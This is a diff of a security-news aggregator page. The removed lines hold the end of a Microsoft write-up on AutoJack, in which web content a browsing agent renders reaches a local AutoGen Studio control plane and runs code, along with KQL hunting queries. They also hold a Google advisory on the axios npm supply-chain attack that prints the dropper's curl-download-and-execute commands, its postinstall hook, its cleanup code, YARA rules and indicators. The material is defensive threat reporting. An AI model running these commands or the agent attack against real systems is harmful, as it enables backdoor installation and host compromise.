-Network Protection and Web Content Filtering and custom IP, URL, and domain indicators can block the headless browser from reaching known malicious sites. They can also let you blackhole an attacker domain across the fleet after identification, provided that headless browser traffic is routed through the operating system network stack inspected by Network Protection.
-Microsoft Defender Vulnerability Management software inventory helps locate machines running vulnerable versions of agent frameworks. One caveat is that pip-installed Python packages might not always appear in standard inventory parsers, so hunt for them through process and file telemetry as well.
-Identity, network, and data containment
-Microsoft Entra Conditional Access gates source, cloud, and tenant access based on risk signals including compliant device, compliant network and agent risk, which blocks access in real-time. Privileged Identity Management (PIM) helps keep admin tokens out of standing reach and limits blast radius if a developer workstation is compromised.
-Microsoft Entra Agent ID extends familiar Microsoft Entra capabilities to AI agents and treats agents as a first-class identity. It brings together identity management, access protection, governance, and compliance controls to manage, govern, and protect AI agents. This reduces the blast radius of confused-deputy attacks such as AutoJack by ensuring agents operate under distinct governed identities rather than inheriting a developer’s ambient privileges.
-Microsoft Defender detects and helps contain lateral movement and credential abuse if an attacker pivots from a compromised workstation into Active Directory (AD) or Microsoft Entra.
-Hardening the dev environment itself
-Microsoft Dev Box provides cloud-hosted, IT-managed developer workstations with Intune, Conditional Access, and Microsoft Defender for Endpoint by default. It is a structurally safer place to run experimental AutoGen builds than a personal laptop. Windows Sandbox, generally available on Pro, Enterprise, and Education editions, is a lightweight equivalent for one-off experiments. A successful AutoJack-style remote code execution (RCE) event is contained within the sandbox and discarded when the sandbox closes.
-Microsoft Defender for Cloud DevOps Security (general availability, or GA), together with GitHub Advanced Security capabilities such as Dependabot, secret scanning, and CodeQL, helps surface vulnerable framework versions pinned in repository manifests and detect credentials that workstation remote code execution could exfiltrate from source code.
-Investigation and response
-Investigation and response
-Microsoft Defender advanced hunting is where the queries below run. Use Microsoft Security Copilot to summarize incidents, generate Kusto Query Language (KQL), and triage alerts produced by the controls above.
-Microsoft Defender detections
-Organizations can use the hunting queries below to identify suspicious child-process creation and related activity consistent with this technique on hosts running AutoGen Studio, then investigate and contain as appropriate.
-Advanced hunting queries
-Use these Microsoft Defender advanced hunting queries to look for the AutoJack chain on hosts running AutoGen Studio. Tune the time range and process names for your environment.
-1. Suspicious children spawned by an autogenstudio host process
-DeviceProcessEvents | where Timestamp > ago(30d) | where InitiatingProcessCommandLine matches regex @"(?i)autogenstudio|autogen[\s_\-]?studio" or InitiatingProcessFolderPath matches regex @"(?i)autogenstudio" | where FileName in~ ( "cmd.exe", "powershell.exe", "pwsh.exe", "bash.exe", "wsl.exe", "certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe", "curl.exe", "wget.exe", "bitsadmin.exe" ) | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | sort by Timestamp desc |
-2. WebSocket reach-outs to the AutoGen Studio MCP control plane carrying server_params
-This is most useful when paired with a network sensor that surfaces local WebSocket upgrade requests, but it can also be approximated by using process command lines that construct the URL manually.
-DeviceNetworkEvents | where Timestamp > ago(30d) | where RemotePort in (8081, 8080) | where RemoteUrl has "/api/mcp/ws/" and RemoteUrl has "server_params=" | project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl | sort by Timestamp desc |
-3. Browser-automation hosts navigating to non-corporate domains during an AutoGen Studio session
-DeviceProcessEvents | where Timestamp > ago(30d) | where InitiatingProcessFileName in~ ("python.exe", "pythonw.exe", "node.exe") | where InitiatingProcessCommandLine has_any ("playwright", "MultimodalWebSurfer", "autogen") | join kind=inner ( DeviceNetworkEvents | where Timestamp > ago(30d) | where not(RemoteUrl has_any("microsoft.com", "msft.net", "office.com", "<your-corp-domains>")) | project DeviceName, InitiatingProcessId, RemoteUrl, Timestamp ) on DeviceName, $left.ProcessId == $right.InitiatingProcessId | project Timestamp, DeviceName, AccountName, ProcessCommandLine, RemoteUrl | sort by Timestamp desc </your-corp-domains> |
-If any of these queries surface activity during a period when AutoGen Studio was running with a browsing or code-execution agent, treat the host as a potential development-environment compromise. Review the host, rotate developer credentials and tokens accessible from it, and check whether anything was written to autostart locations.
-What this means for the broader agent ecosystem
-AutoJack is less interesting because of its individual bugs, each of which is a reasonable shortcut in a research-grade prototype, and more interesting because of the chain’s overall shape. We expect to see the same pattern across the ecosystem:
-- A development tool exposes a powerful local control plane.
-- That control plane is protected by an origin or localhost-only assumption.
-- The user routinely runs an agent on the same machine, and that agent is willing to render arbitrary web content.
-That triangle dissolves the localhost trust boundary. The durable response is to authenticate and authorize every control plane regardless of origin, allowlist dangerous primitives such as process execution, file write and network egress, and isolate agent identity from developers identity.
-AutoJack shows that localhost is no longer a trust boundary when agents can browse untrusted content and interact with privileged local control planes. The durable defense is consistent with control-plane authentication and authorization, strict allowlisting of high-risk actions, and identity isolation between agents and developers.
-This research is provided by Microsoft Defender Security Research, Shaked Ilan, and with contributions from members of Microsoft Threat Intelligence.
-Learn more
-For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
-To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
-To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
-Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
-- Explore
-[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
-[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
-[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
-[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime)</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">Who Runs the Ransomware Group ‘The Gentlemen?’</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/who-runs-the-ransomware-group-the-gentlemen/" target="_blank">Original Link</a></p>
             <div class="content-text">A cybercrime group known as The Gentlemen has emerged as the second most active ransomware gang by victim count, rapidly attracting a talented pool of hackers through an aggressive recruitment strategy that promises affiliates 90 percent of any ransom paid by victims. This post examines clues pointing to a real life identity for the administrator of The Gentlemen ransomware group.
@@ -386,7 +605,7 @@ Very interesting article, I always say there’s only one internet and there’s
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-7" class="article-body">
+        <div id="art-9" class="article-body">
             <h2 class="article-title">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</h2>
             <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/how-to-train-your-dragons-analysts" target="_blank">Original Link</a></p>
             <div class="content-text">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team
@@ -441,235 +660,6 @@ The graphic below gives a quick overview of the assessment, and which categories
 In addition to all the engagement styles we offer above, we are always more than happy to sit down and chat about the security posture of your organization. If something above doesn’t match what you’re looking for, let us know! We also offer customized approaches that may better suit your team’s needs.
 Conclusion
 Picking the right Purple Team assessment for your organization can be a challenging endeavor, whether it be identifying a starting point, or putting together a roadmap for next-steps. TrustedSec’s account managers and consulting team have the skills and expertise to provide actionable guidance to assist your organization at all stages of its journey. If you have questions or are interested in these services, please [get in touch with us](https://trustedsec.com/contact)!</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-8" class="article-body">
-            <h2 class="article-title">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package/" target="_blank">Original Link</a></p>
-            <div class="content-text">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack
-Google Threat Intelligence Group
-Mandiant
-Google Threat Intelligence
-Visibility and context on the threats that matter most.
-[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
-Written by: Austin Larsen, Dima Lenz, Adrian Hernandez, Tyler McLellan, Christopher Gardner, Ashley Zaya, Michael Rudden, Mon Liclican, Muhammad Umair
-Introduction
-Google Threat Intelligence Group (GTIG) is tracking an active software supply chain attack targeting the popular Node Package Manager (NPM) package "[axios](https://www.npmjs.com/package/axios)." Between March 31, 2026, 00:21 and 03:20 UTC, an attacker introduced a malicious dependency named "plain-crypto-js
-" into axios NPM releases versions 1.14.1 and 0.30.4. Axios is the most popular JavaScript library used to simplify HTTP requests, and these packages typically have over 100 million and 83 million weekly downloads, respectively. This malicious dependency is an obfuscated dropper that deploys the WAVESHAPER.V2 backdoor across Windows, macOS, and Linux.
-GTIG attributes this activity to [UNC1069](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a financially motivated North Korea-nexus threat actor active since at least 2018, based on the use of WAVESHAPER.V2, an updated version of [WAVESHAPER](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering) previously used by this threat actor. Further, analysis of infrastructure artifacts used in this attack shows overlaps with infrastructure used by UNC1069 in past activities.
-This blog details the attack lifecycle, from the initial account compromise to the deployment of operating system (OS)-specific payloads, and provides actionable guidance for defenders to identify and mitigate this threat.
-Campaign Overview
-On March 31, 2026, GTIG observed the introduction of plain-crypto-js
-version 4.2.1 as a dependency in the legitimate axios
-package version 1.14.1. Analysis indicates the maintainer account associated with the axios
-package was compromised, with the associated email address changed to an attacker-controlled account (ifstap@proton.me
-).
-The threat actor used the postinstall
-hook within the "package.json"
-file of the malicious dependency to achieve silent execution. Upon installation of the compromised axios
-package, NPM automatically executes an obfuscated JavaScript dropper named "setup.js"
-in the background.
-"scripts": {
-"test": "echo \"Error: no test specified\" && exit 1",
-"postinstall": "node setup.js"
-}
-Malware Analysis
-The plain-crypto-js
-package serves as a payload delivery vehicle. The core component, SILKBELL, setup.js
-(SHA256: e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09
-), dynamically checks the target system's operating system upon execution to deliver platform-specific payloads.
-The script uses a custom XOR and Base64-based string obfuscation routine to conceal the command-and-control (C2 or C&C) URL and host OS execution commands. To evade static analysis, it dynamically loads fs
-, os
-, and execSync
-. After successfully dropping the secondary payload, setup.js
-attempts to delete itself and revert the modified package.json
-to hide forensic traces of the postinstall
-hook.
-Operating System-Specific Execution Paths
-Depending on the identified platform, the dropper executes the following routines.
-Windows
-The dropper actively hunts for the native powershell.exe
-binary. To evade detection, it copies the legitimate executable to %PROGRAMDATA%\wt.exe
-. It then downloads a PowerShell script via curl
-using the POST body packages.npm.org/product1
-and saves it to the user's AppData Temp directory (e.g., %TEMP%\6202033.ps1
-). The payload is executed using a copied Windows Terminal executable with hidden and execution policy bypass flags.
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "cmd.exe /c curl -s -X POST -d packages.npm.org/product1 http://sfrclak[.]com:8000/6202033 > %TEMP%\6202033.ps1
-& %PROGRAMDATA%\wt.exe -w hidden -ep bypass -file %TEMP%\6202033.ps1 http://sfrclak[.]com:8000/6202033 & del ""PS_PATH"" /f", 0, False
-macOS
-The malware uses bash
-and curl
-to download a native Mach-O binary payload to /Library/Caches/com.apple.act.mond
-using the POST body packages.npm.org/product0
-. It modifies permissions to make the file executable and launches it via zsh
-in the background.
-try
-do shell script "
-curl -o /Library/Caches/com.apple.act.mond
--d packages.npm.org/product0
--s http://sfrclak.com:8000/6202033
-&& chmod 770 /Library/Caches/com.apple.act.mond
-&& /bin/zsh -c "/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &"
-&> /dev/null"
-"
-end try
-do shell script "rm -rf tmp/6202033"
-Linux
-The script downloads a Python backdoor to /tmp/ld.py
-using the POST body packages.npm.org/product2
-.
-Cleanup
-Aside from removing downloaded scripts in two execution branches, the script attempts to remove itself and replace an injected package.json with an original one, which was stored as "package.md
-".
-const K = __filename;
-t.unlink(K, (x => {}))
-t.unlink('package.json', (x => {})), t.rename('package.md', 'package.json', ord)
-WAVESHAPER.V2 Backdoor Capabilities
-The platform-specific payloads ultimately deploy variants of a backdoor tracked by GTIG as WAVESHAPER.V2, a backdoor written in C++ that targets macOS to collect system information, enumerate directories, or execute additional payloads and that connects to the C2 provided via command-line arguments. Notably, GTIG identified additional variants of WAVESHAPER.V2 written in PowerShell and Python to target diverse environments. Regardless of the operating system, the malware beacons to the C2 endpoint over port 8000 at 60-second intervals. The beacon consists of Base64-encoded JSON data and uses a hard-coded User-Agent:
-mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)
-Following the initial beaconing to the adversary infrastructure, WAVESHAPER.V2 continuously polls, pausing for 60 seconds awaiting instructions. The server response determines the next action taken by the implant. The backdoor supports multiple commands outlined in the Table 1.
-On Windows, persistence is achieved by creating a hidden batch file (%PROGRAMDATA%\system.bat
-) and adding a new entry named MicrosoftUpdate
-to HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
-to launch it at logon.
-WAVESHAPER.V2 acts as a fully functional RAT with the following capabilities:
--
-Reconnaissance: Extracts system telemetry, including hostname, username, boot time, time zone, OS version, and detailed running process lists.
--
-Command Execution: Supports multiple execution methods, including in-memory Portable Executable (PE) injection and arbitrary shell commands. The shell execution command expects a script and script parameters from C2; if no script is provided, the parameter is executed as a PowerShell command, but if a script is provided, it is either Base64-encoded or placed into a file depending on its size.
--
-File System Enumeration: Returns detailed metadata for requested target directories by continuously recursing through the file system.
-Attribution
-GTIG attributes this activity to [UNC1069](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a financially motivated North Korea-nexus threat actor active since 2018. Analysis of the C2 infrastructure (sfrclak[.]com
-resolving to 142.11.206.73
-) revealed connections from a specific AstrillVPN node previously used by UNC1069. Additionally, adjacent infrastructure hosted on the same ASN has been historically linked to UNC1069 operations.
-Furthermore, WAVESHAPER.V2 is a direct evolution of [WAVESHAPER](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a macOS and Linux backdoor previously attributed to UNC1069. While the original WAVESHAPER uses a lightweight, raw binary C2 protocol and employs code packing, WAVESHAPER.V2 communicates using JSON, collects additional system information, and supports more backdoor commands. Despite these upgrades, both versions accept their C2 URL dynamically via command-line arguments, share identical C2 polling behaviors and an uncommon User-Agent string, and deploy secondary payloads to identical temporary directories (e.g., /Library/Caches/com.apple.act.mond
-).
-Outlook and Implications
-The impact of this attack by North Korea-nexus actors is broad and has ripple effects as other popular packages rely on axios as a dependency. Notably, UNC1069 isn’t the only threat actor that has launched successful open source supply chain attacks in recent weeks. UNC6780 (also known as TeamPCP) recently poisoned GitHub Actions and PyPI packages associated with projects like Trivy, Checkmarx, and LiteLLM to deploy the SANDCLOCK credential stealer and facilitate follow-on extortion operations.
-Hundreds of thousands of stolen secrets could potentially be circulating as a result of these recent attacks. This could enable further software supply chain attacks, software as a service (SaaS) environment compromises (leading to downstream customer compromises), ransomware and extortion events, and cryptocurrency theft over the near term.
-Supply chain compromise is a particularly dangerous tactic because it abuses the inherent trust that users and enterprise administrators place in hardware, software, and updates supplied by reputable vendors as well as the trust they may not realize they are placing in collaborative code-sharing communities. Defenders should pay close attention to these campaigns, and enterprises should initiate dedicated efforts to assess the existing impact, remediate compromised systems, and harden environments against future attacks.
-Remediation
-GTIG urges all developers and organizations using the axios package to take immediate corrective action. Priority should be given to auditing dependency trees for compromised versions, isolating affected hosts, and rotating any potentially exposed secrets or credentials. Following initial containment, organizations must implement long-term hardening through strict version pinning and enhanced supply-chain monitoring.
--
-Version Control: Do not upgrade to axios version 1.14.1 or 0.30.4. Ensure corporate-managed NPM repositories are configured to serve only known-good versions (e.g., 1.14.0 or earlier; 0.30.3 or earlier).
--
-Dependency Pinning: Pin axios to a known safe version in your
-package-lock.json
-to prevent accidental upgrades. -
-Malicious Package Audit: Inspect project lockfiles specifically for the 'plain-crypto-js' package (versions 4.2.0 or 4.2.1). Use tools like
-[Wiz](https://wiz.io)or[Open Source Insights](https://deps.dev/)for deeper dependency auditing. -
-Pipeline Security: Pause CI/CD deployments for any package relying on axios. Validate that builds are not pulling "latest" versions before redeploying with pinned, safe versions.
--
-Incident Response: If
-plain-crypto-js
-is detected, assume the host environment is compromised. Revert the environment to a known-good state and rotate all credentials or secrets present on that machine. -
-Network Defense: Block all traffic to sfrclak[.]com and the command & control IP: 142.11.206.73. Monitor and alert on any endpoint communication attempts to this domain.
--
-Cache Remediation: Clear local and shared npm, yarn, and pnpm caches on all workstations and build servers to prevent re-infection during subsequent installs.
--
-Endpoint Protection: Deploy EDR to protect developer environments. Monitor for suspicious processes spawning from Node.js applications that match known Indicators of Compromise (IOCs).
--
-Credential Management: Rotate all tokens and API keys used by applications confirmed to have run indicators of compromise (IOCs).
-- Developer Sandboxing & Secret Vaulting: Isolate development environments in containers or sandboxes to restrict host filesystem access, and migrate plaintext secrets to the OS keychain using
-[aws-vault](https://github.com/ByteNess/aws-vault?tab=readme-ov-file). This ensures compromised packages cannot programmatically scrape credentials or execute malicious scripts directly on the host machine.
-Indicators of Compromise (IOCs)
-To assist the wider community in hunting and identifying the activity outlined in this blog post, we have included IOCs in a free [GTI Collection](https://www.virustotal.com/gui/collection/c5adea0fa8aac14e6aabd8d3d4a1d19e4cd0eb76e679f2e9d3fed2a3170c09bb/summary) for registered users.
-Network Indicators
-File Indicators
-YARA Rules
-These rules may be most useful on developer workstations, CI/build systems, and other suspected impacted hosts for retrospective hunting and validation.
-rule G_Backdoor_WAVESHAPER.V2_PS_1
-{
-meta:
-description = "Detects the WAVESHAPER.V2 PowerShell backdoor which communicates with C2 via base64 encoded JSON beacons and supports PE injection and script execution"
-author = "GTIG"
-md5 = "04e3073b3cd5c5bfcde6f575ecf6e8c1"
-date_created = "2026/03/31"
-date_modified = "2026/03/31"
-rev = 1
-platforms = "Windows"
-family = "WAVESHAPER.V2"
-strings:
-$ss1 = "packages.npm.org/product1" ascii wide nocase
-$ss2 = "Extension.SubRoutine" ascii wide nocase
-$ss3 = "rsp_peinject" ascii wide nocase
-$ss4 = "rsp_runscript" ascii wide nocase
-$ss5 = "rsp_rundir" ascii wide nocase
-$ss6 = "Init-Dir-Info" ascii wide nocase
-$ss7 = "Do-Action-Ijt" ascii wide nocase
-$ss8 = "Do-Action-Scpt" ascii wide nocase
-condition:
-uint16(0) != 0x5A4D and filesize < 100KB and 5 of ($ss*)
-}
-rule G_Hunting_Downloader_suspected_UNC1069_PS_1
-{
-meta:
-description = "Detects PowerShell dropper associated with suspected UNC1069 and Axios npm package supply chain attack. Associated to WAVESHAPER.V2"
-author = "GTIG"
-md5 = "089e2872016f75a5223b5e02c184dfec"
-date_created = "2026/03/31"
-date_modified = "2026/03/31"
-rev = 1
-platforms = "Windows"
-strings:
-$ss1 = "start /min powershell -w h" ascii wide nocase
-$ss2 = "[scriptblock]::Create([System.Text.Encoding]::UTF8.GetString" ascii wide nocase
-$ss3 = "Invoke-WebRequest -UseBasicParsing" ascii wide nocase
-$ss4 = "-Method POST -Body" ascii wide nocase
-$ss5 = "packages.npm.org/product1" ascii wide nocase
-condition:
-uint16(0) != 0x5A4D and filesize < 5KB and all of them
-}
-rule G_Hunting_Downloader_SILKBELL_1
-{
-meta:
-description = "Detects the obfuscated version of the JS NPM supply chain downloader using Base64 obfuscation and custom XOR. Associated with WAVESHAPER.V2"
-author = "GTIG"
-md5 = "7658962ae060a222c0058cd4e979bfa1"
-date_created = "2026/03/31"
-date_modified = "2026/03/31"
-rev = 1
-platforms = "Any"
-strings:
-$ss1 = "OrDeR_7077" ascii wide fullword
-$ss2 = "String.fromCharCode(S^a^333)" ascii wide
-$ss3 = "\"TE9DQUw^\".replaceAll(\"^\",\"=\")" ascii wide
-$ss4 = "\"UFM_\".replaceAll(\"_\",\"=\")" ascii wide
-$ss5 = "\"U0NSXw--\".replaceAll(\"-\",\"=\")" ascii wide
-$ss6 = "\"UFNfQg--\".replaceAll(\"-\",\"=\")" ascii wide
-$ss7 = "\"d2hlcmUgcG93ZXJzaGVsbA((\".replaceAll(\"(\",\"=\")" ascii wide
-condition:
-uint16(0) != 0x5A4D and filesize < 100KB and all of them
-}
-Google Security Operations (SecOps)
-Google Security Operations (SecOps) customers have access to the following broad category rules and more under the Mandiant Intel Emerging Threats rule pack.
--
-Curl Writing Apple System File to Staging Directory
--
-Node Spawning Nohup Osascript
--
-Node Spawning Windows Script Host With Delete Command
--
-Windows Script Host Spawning Shell With Curl
--
-Windows Terminal In Suspicious Staging Directory
-Wiz
-Wiz customers should check their Wiz Threat Center for information on this advisory and whether or not they are impacted. For more information refer to Wiz’s blog post, [Axios NPM Distribution Compromised in Supply Chain Attack](https://www.wiz.io/blog/axios-npm-compromised-in-supply-chain-attack).</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-9" class="article-body">
-            <h2 class="article-title">Updates to the MSSQLHound OpenGraph Collector for BloodHound</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>tl;dr: MSSQLHound, a PowerShell script that collects security information from remote MSSQL Server instances, now scans them to determine whether or not NTLM relay attacks are possible, accounts for a recent privilege escalation vulnerability, and includes queries you can import into the BloodHound attack path graph to visualize, navigate, and remediate misconfigurations in MSSQL. Updates [&#8230;]</p>
-<p>The post <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/">Updates to the MSSQLHound OpenGraph Collector for BloodHound</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
-
-[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
